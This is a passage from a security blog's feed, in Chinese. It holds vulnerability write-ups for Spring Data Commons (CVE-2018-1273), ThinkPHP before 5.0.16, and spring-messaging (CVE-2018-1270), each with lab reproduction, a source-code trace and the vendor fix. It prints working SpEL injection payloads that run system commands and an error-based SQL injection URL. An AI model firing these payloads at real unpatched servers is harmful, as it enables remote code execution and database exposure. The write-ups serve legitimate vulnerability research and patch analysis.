      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="gitlist" scheme="http://chybeta.github.io/tags/gitlist/"/>
    
  </entry>
  
  <entry>
    <title>Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】</title>
    <link href="http://chybeta.github.io/2018/04/11/Spring-Data-Commons-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1273%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/04/11/Spring-Data-Commons-Remote-Code-Execution-分析-【CVE-2018-1273】/</id>
    <published>2018-04-11T15:35:54.000Z</published>
    <updated>2018-04-12T14:36:41.505Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2269" target="_blank" rel="external">Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】</a><br><a id="more"></a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://pivotal.io/security/cve-2018-1273" target="_blank" rel="external">https://pivotal.io/security/cve-2018-1273</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/1.jpg?raw=true" alt=""></p>
<p>漏洞影响版本：</p>
<ul>
<li>2.0.x users should upgrade to 2.0.6</li>
<li>1.13.x users should upgrade to 1.13.11</li>
<li>Older versions should upgrade to a supported branch</li>
</ul>
<h1 id="探索过程"><a href="#探索过程" class="headerlink" title="探索过程"></a>探索过程</h1><p>从漏洞公告页的Refference给出的两个链接<a href="https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a" target="_blank" rel="external">commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a</a>和<a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653" target="_blank" rel="external">commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653</a>，可以看出该漏洞为SpEL注入。</p>
<p>在漏洞发现者<a href="https://twitter.com/h3xstream" target="_blank" rel="external">Philippe Arteau @h3xstream</a>的<a href="https://twitter.com/h3xstream/status/984098634353475584" target="_blank" rel="external">推文和回复</a>中提到：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/2.jpg?raw=true" alt=""><br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@requestMapping</span>(<span class="string">"/users"</span>)</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</div><div class="line">    <span class="meta">@requestsMapping</span>(method= RequestMethod.POST)</div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">register</span><span class="params">(UserForm userForm, BindingResult binding, Model model)</span></span>&#123;&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>此外 <a href="https://twitter.com/SpringData" target="_blank" rel="external">Spring Data Team @SpringData</a>在该推文中回复：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Spring Data Team</div><div class="line">‏That&apos;s only true if the form backing object is a projection interface. Simple DTOs are safe.</div></pre></td></tr></table></figure></p>
<p>因此可以推测出几个漏洞条件：</p>
<ol>
<li>Spel注入</li>
<li>a form accessible</li>
<li>form backing object is a projection interface</li>
</ol>
<p>另外根据<a href="https://twitter.com/h3xstream" target="_blank" rel="external">Philippe Arteau @h3xstream</a>提供的示例代码，不难发现这是spring官方的<a href="https://github.com/spring-projects/spring-data-examples/blob/master/web/example/src/main/java/example/users/web/UserController.java#L83" target="_blank" rel="external">示例代码 spring-data-examples 中的一部分</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/3.jpg?raw=true" alt=""></p>
<p>因此环境搭建以及漏洞探索过程不妨从此入手。</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/spring-projects/spring-data-examples</div></pre></td></tr></table></figure>
<p>我直接采用默认配置pom.xml，对应的Spring Data Commons版本为2.0.5<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/9.jpg?raw=true" alt=""></p>
<p>运行其中的web\example。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/4.jpg?raw=true" alt=""><br>这是一个简单的注册页面，输入用户名、密码并重复。</p>
<p>抓包，修改payload数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]=chybeta&amp;password=chybeta&amp;repeatedPassword=chybeta</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/2.gif?raw=true" alt=""></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>限于能力，还真不知道这个洞该从何谈起。干脆就定位到 org/springframework/data/web/MapDataBinder.java:174 。之所以定位到这里，官方的<a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653" target="_blank" rel="external">commit</a>中在这里去除了StandardEvaluationContext，改用SimpleEvaluationContext。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/5.jpg?raw=true" alt=""><br>可以看到这里的propertyName即我们传入的参数名，其中带有了payaload。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/6.jpg?raw=true" alt=""><br>继续执行至187行，对其进行解析<code>parseExpression(propertyName)</code></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/7.jpg?raw=true" alt=""><br>继续执行到217行，解析了spel表达式，成功执行calc.exe。</p>
<p>跟<a href="https://xz.aliyun.com/t/2252" target="_blank" rel="external">spring-messaging Remote Code Execution 分析-【CVE-2018-1270】</a>中使用的<code>expression.getValue(context, Boolean.class)</code>不同，这里执行spel表达式使用的是<code>expression.setValue(context, value)</code>。以后在找类似的spel表达式注入时可以针对性查找这两条语句。</p>
<p>上图来自0c0c0f师傅的<a href="http://www.polaris-lab.com/index.php/archives/501/" target="_blank" rel="external">CVE-2018-1270 Remote Code Execution with spring-messaging</a> </p>
<h1 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h1><p>以 spring-data-commons 2.0.6 版本为例 <a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653" target="_blank" rel="external">https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/10.jpg?raw=true" alt=""></p>
<p>换用SimpleEvaluationContext，用于实现简单的数据绑定，保持灵活性减少安全隐患（来自<a href="https://cert.360.cn/warning/detail?id=3efa573a1116c8e6eed3b47f78723f12" target="_blank" rel="external">360cert语</a>）。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://jira.spring.io/browse/DATACMNS-1282" target="_blank" rel="external">DATACMNS-1282</a></li>
<li><a href="https://jira.spring.io/browse/DATACMNS-1264" target="_blank" rel="external">DATACMNS-1264</a></li>
<li><a href="https://docs.spring.io/spring-data/jpa/docs/current/reference/html/#projections" target="_blank" rel="external">projections</a></li>
<li><a href="https://github.com/spring-projects/spring-data-examples" target="_blank" rel="external">spring-data-examples</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&amp;mid=2247483666&amp;idx=1&amp;sn=91e3b2aab354c55e0677895c02fb068c&amp;from=1084195010&amp;wm=20005_0002&amp;weiboauthoruid=5458358938" target="_blank" rel="external">xxlegend大师傅</a></li>
</ul>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>Spring Data Commons 2.0.5版本怼了一天，从早上8点怼到现在，尽管确定了Spel注入点，但就是用普通的表达式弹不出计算器。比如使用 <code>T(java.lang.Runtime).getRuntime().exec(&#39;calc.exe&#39;)</code></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/3.gif?raw=true" alt=""></p>
<p>用动态调用<code>(new java.lang.ProcessBuilder(&#39;calc&#39;)).start()</code>的方式也会触发失败。</p>
<p>刚刚才看到<a href="https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&amp;mid=2247483666&amp;idx=1&amp;sn=91e3b2aab354c55e0677895c02fb068c&amp;from=1084195010&amp;wm=20005_0002&amp;weiboauthoruid=5458358938" target="_blank" rel="external">xxlegend大师傅</a>在其中说明了原因Spring Data Commons 2.0.5版本中 MapDataBinder.java 的182添加了：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">context.setTypeLocator(typeName -&gt; &#123;</div><div class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>最后用下面的payload可以绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]=chybeta&amp;password=chybeta&amp;repeatedPassword=chybeta</div></pre></td></tr></table></figure></p>
<p>另外matthiaskaiser 在 <a href="https://gist.github.com/matthiaskaiser/bfb274222c009b3570ab26436dc8799e" target="_blank" rel="external">https://gist.github.com/matthiaskaiser/bfb274222c009b3570ab26436dc8799e</a> 给出了另一个payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username[#this.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;xterm&apos;)&quot;)]=asdf</div></pre></td></tr></table></figure></p>
<p>关于这个payload是怎么出来的，可以借鉴以下几个漏洞</p>
<ol>
<li><a href="http://drops.xmd5.com/static/drops/papers-5107.html" target="_blank" rel="external">ElasticSearch Groovy脚本远程代码执行漏洞分析（CVE-2015-1427）</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180412205148-4334be60-3e50-1.png" alt="13.jpg"></li>
<li><a href="https://jaq.alibaba.com/blog.htm?id=48" target="_blank" rel="external">WebView 远程代码执行漏洞浅析</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180412205148-437762b0-3e50-1.png" alt="12.jpg"></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2269&quot;&gt;Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp框架 &lt; 5.0.16 sql注入漏洞分析</title>
    <link href="http://chybeta.github.io/2018/04/10/Thinkphp%E6%A1%86%E6%9E%B6-5-0-16-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://chybeta.github.io/2018/04/10/Thinkphp框架-5-0-16-sql注入漏洞分析/</id>
    <published>2018-04-09T23:22:49.000Z</published>
    <updated>2018-04-09T23:23:52.523Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2257" target="_blank" rel="external">Thinkphp框架 &lt; 5.0.16 sql注入漏洞分析</a><br><a id="more"></a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/1.jpg?raw=true" alt=""></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>搭建好数据库，以我自己的配置为例。数据库为tptest，表名为user，其中有两个字段id和username<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/2.jpg?raw=true" alt=""></p>
<p>thinkphp官网下载5.0.15版本： <a href="http://www.thinkphp.cn/down/1125.html" target="_blank" rel="external">http://www.thinkphp.cn/down/1125.html</a> 。修改数据库配置信息 application/database.php。在 application/config.php 中打开调试和trace，<code>app_debug</code>和<code>app_trace</code>均为true。在 application/index/controller/Index.php 中Index类中添加方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">testsql</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    $username = input(<span class="string">'get.username/a'</span>);</div><div class="line">    db(<span class="string">'user'</span>)-&gt;where([<span class="string">'id'</span>=&gt; <span class="number">1</span>])-&gt;insert([<span class="string">'username'</span>=&gt;$username]);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php/index/index/testsql?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/3.jpg?raw=true" alt=""></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>通过input获取到参数后，<code>username</code>变量情况如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/4.jpg?raw=true" alt=""></p>
<p>跟入insert，thinkphp/library/think/db/Query.php:2078<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">(array $data = [], $replace = false, $getLastInsID = false, $sequence = null)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="comment">// 分析查询表达式</span></div><div class="line">    $options = <span class="keyword">$this</span>-&gt;parseExpress();</div><div class="line">    $data    = array_merge($options[<span class="string">'data'</span>], $data);</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/5.jpg?raw=true" alt=""></p>
<p>接下去执行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = <span class="keyword">$this</span>-&gt;builder-&gt;insert($data, $options, $replace);</div></pre></td></tr></table></figure></p>
<p>跟入 thinkphp/library/think/db/Builder.php:720：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">(array $data, $options = [], $replace = false)</span></span></div><div class="line">  &#123;</div><div class="line">      <span class="comment">// 分析并处理数据</span></div><div class="line">      $data = <span class="keyword">$this</span>-&gt;parseData($data, $options);</div><div class="line">      <span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</div><div class="line">          <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">      &#125;</div><div class="line">      ...</div></pre></td></tr></table></figure></p>
<p>跟入<code>parseData</code>至 thinkphp/library/think/db/Builder.php:101 ，相关变量信息已经注释添加。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseData</span><span class="params">($data, $options)</span></span></div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">    <span class="comment">// 注</span></div><div class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123; <span class="comment">// 第 101 行左右</span></div><div class="line">    <span class="comment">//  $key : "username"</span></div><div class="line">    <span class="comment">//  $val : &#123;"inc","updatexml(1,concat(0x7,user(),0x7e),1)","1"&#125;</span></div><div class="line">        $item = <span class="keyword">$this</span>-&gt;parseKey($key, $options);</div><div class="line">        <span class="keyword">if</span> (is_object($val) &amp;&amp; method_exists($val, <span class="string">'__toString'</span>)) &#123;</div><div class="line">            ....</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === strpos($key, <span class="string">'.'</span>) &amp;&amp; !in_array($key, $fields, <span class="keyword">true</span>)) &#123;</div><div class="line">            ...</div><div class="line">        &#125; <span class="keyword">elseif</span> (is_null($val)) &#123;</div><div class="line">            ...</div><div class="line">        &#125; <span class="keyword">elseif</span> (is_array($val) &amp;&amp; !<span class="keyword">empty</span>($val)) &#123;</div><div class="line">            <span class="comment">// $val[0] = "inc"</span></div><div class="line">            <span class="keyword">switch</span> ($val[<span class="number">0</span>]) &#123;</div><div class="line">                <span class="keyword">case</span> <span class="string">'exp'</span>:</div><div class="line">                    $result[$item] = $val[<span class="number">1</span>];</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'inc'</span>:</div><div class="line">                    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'+'</span> . floatval($val[<span class="number">2</span>]);</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'dec'</span>:</div><div class="line">                    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'-'</span> . floatval($val[<span class="number">2</span>]);</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">     ...</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $result;</div></pre></td></tr></table></figure>
<p>可以看出<code>$val</code>是数组，且根据<code>$val[0]</code>值为<code>inc</code>，会通过switch语句进入到下面这条：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'inc'</span>:</div><div class="line">    <span class="comment">// $val[1] = "updatexml(1,concat(0x7,user(),0x7e),1)"</span></div><div class="line">    <span class="comment">// $val[2] = "1"</span></div><div class="line">    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'+'</span> . floatval($val[<span class="number">2</span>]);</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
<p>跟入此处的<code>parseKey</code>，即thinkphp/library/think/db/builder/Mysql.php:90<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseKey</span><span class="params">($key, $options = [])</span></span></div><div class="line">&#123;</div><div class="line">    $key = trim($key);</div><div class="line">    <span class="keyword">if</span> (strpos($key, <span class="string">'$.'</span>) &amp;&amp; <span class="keyword">false</span> === strpos($key, <span class="string">'('</span>)) &#123;</div><div class="line">        <span class="comment">// JSON字段支持</span></div><div class="line">        <span class="keyword">list</span>($field, $name) = explode(<span class="string">'$.'</span>, $key);</div><div class="line">        $key                = <span class="string">'json_extract('</span> . $field . <span class="string">', \'$.'</span> . $name . <span class="string">'\')'</span>;</div><div class="line">    &#125; <span class="keyword">elseif</span> (strpos($key, <span class="string">'.'</span>) &amp;&amp; !preg_match(<span class="string">'/[,\'\"\(\)`\s]/'</span>, $key)) &#123;</div><div class="line">        <span class="keyword">list</span>($table, $key) = explode(<span class="string">'.'</span>, $key, <span class="number">2</span>);</div><div class="line">        <span class="keyword">if</span> (<span class="string">'__TABLE__'</span> == $table) &#123;</div><div class="line">            $table = <span class="keyword">$this</span>-&gt;query-&gt;getTable();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'alias'</span>][$table])) &#123;</div><div class="line">            $table = $options[<span class="string">'alias'</span>][$table];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/[,\'\"\*\(\)`.\s]/'</span>, $key)) &#123;</div><div class="line">        $key = <span class="string">'`'</span> . $key . <span class="string">'`'</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($table)) &#123;</div><div class="line">        <span class="keyword">if</span> (strpos($table, <span class="string">'.'</span>)) &#123;</div><div class="line">            $table = str_replace(<span class="string">'.'</span>, <span class="string">'`.`'</span>, $table);</div><div class="line">        &#125;</div><div class="line">        $key = <span class="string">'`'</span> . $table . <span class="string">'`.'</span> . $key;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $key; <span class="comment">// $key : "updatexml(1,concat(0x7,user(),0x7e),1)"</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>此处并未对传入的<code>$key</code>进行更多的过滤与检查，最后返回的仍然是<code>1 and (updatexml(1,concat(0x7,user(),0x7e),1))</code></p>
<p>回到<code>parseData</code>，<code>floatval($val[2])</code>返回1，这也正是我们要传入<code>username[2]=1</code>的原因。将其与前面经过<code>parseKey</code>的结果进行拼接后返回给<code>result</code><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/6.jpg?raw=true" alt=""></p>
<p>回到 thinkphp/library/think/db/Query.ph 的 insert 中：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/7.jpg?raw=true" alt=""></p>
<p>sql注入成功。</p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>官方commit： <a href="https://github.com/top-think/framework/commit/363fd4d90312f2cfa427535b7ea01a097ca8db1b" target="_blank" rel="external">https://github.com/top-think/framework/commit/363fd4d90312f2cfa427535b7ea01a097ca8db1b</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/8.jpg?raw=true" alt=""><br>在进行<code>dec</code>和<code>inc</code>操作之前对<code>$val[1]</code>的值进行了再次确认。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2257&quot;&gt;Thinkphp框架 &amp;lt; 5.0.16 sql注入漏洞分析&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="sql注入" scheme="http://chybeta.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="thinkphp" scheme="http://chybeta.github.io/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>spring-messaging Remote Code Execution 分析-【CVE-2018-1270】</title>
    <link href="http://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1270%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-分析-【CVE-2018-1270】/</id>
    <published>2018-04-07T04:15:46.000Z</published>
    <updated>2018-04-11T15:36:25.167Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2252" target="_blank" rel="external">spring-messaging Remote Code Execution 分析-【CVE-2018-1270】</a><br><a id="more"></a></p>
<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p><a href="https://pivotal.io/security/cve-2018-1270" target="_blank" rel="external">https://pivotal.io/security/cve-2018-1270</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/1.jpg?raw=true" alt=""></p>
<p>漏洞影响版本:</p>
<ol>
<li>Spring Framework 5.0 to 5.0.4</li>
<li>Spring Framework 4.3 to 4.3.14</li>
<li>Older unsupported versions are also affected</li>
</ol>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>利用官方示例 <a href="https://github.com/spring-guides/gs-messaging-stomp-websocket" target="_blank" rel="external">https://github.com/spring-guides/gs-messaging-stomp-websocket</a> ，git clone后checkout到未更新版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/spring-guides/gs-messaging-stomp-websocket</div><div class="line"></div><div class="line">git checkout 6958af0b02bf05282673826b73cd7a85e84c12d3</div></pre></td></tr></table></figure></p>
<p>用IDEA打开gs-messaging-stomp-websocket目录下的complete项目，修改app.js中的第15行：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> header  = &#123;<span class="string">"selector"</span>:<span class="string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span>&#125;;</div><div class="line">    <span class="keyword">var</span> socket = <span class="keyword">new</span> SockJS(<span class="string">'/gs-guide-websocket'</span>);</div><div class="line">    stompClient = Stomp.over(socket);</div><div class="line">    stompClient.connect(&#123;&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">frame</span>) </span>&#123;</div><div class="line">        setConnected(<span class="literal">true</span>);</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'Connected: '</span> + frame);</div><div class="line">        stompClient.subscribe(<span class="string">'/topic/greetings'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">greeting</span>) </span>&#123;</div><div class="line">            showGreeting(<span class="built_in">JSON</span>.parse(greeting.body).content);</div><div class="line">        &#125;,header);</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>增加了一个header头部，其中指定了<code>selector</code>，其值即payload。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>点击connect后建立起连接，在文本框中随意输入，点击Send，触发poc：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/2.gif?raw=true" alt=""></p>
